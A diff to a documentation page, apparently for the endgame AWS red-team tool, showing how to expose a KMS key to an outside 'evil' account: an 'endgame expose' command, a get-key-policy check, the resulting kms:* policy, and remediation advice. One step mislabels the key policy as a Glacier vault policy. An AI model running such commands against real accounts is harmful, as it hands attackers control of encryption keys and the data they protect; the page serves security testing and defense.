@@ -2,9 +2,50 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service kms --name test-resource-exposure
+```
+
+* To view the contents of the Glacier Vault Access Policy, run the following:
+
+```bash
+export VICTIM_KEY_ARN=arn:aws:kms:us-east-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab
+
+aws kms get-key-policy --key-id $VICTIM_KEY_ARN --policy-name default
+```
+
+* Observe that the output of the overly permissive KMS Key Policy resembles the example shown below.
+
 ## Example
 
+Observe that the policy below allows the evil principal (`arn:aws:iam::999988887777:user/evil`) the `kms:*` permissions to the KMS Key.
+
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "Endgame",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "arn:aws:iam::999988887777:user/evil"
+            },
+            "Action": "kms:*",
+            "Resource": "arn:aws:kms:us-east-1:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab"
+        }
+    ]
+}
+```
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 * **Trusted Accounts Only**: Ensure that KMS Keys are only shared with trusted accounts, and that the trusted accounts truly need access to the key.
@@ -21,3 +62,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 ## References
 
 * [put-key-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/kms/put-key-policy.html)
+* [get-key-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/kms/get-key-policy.html)
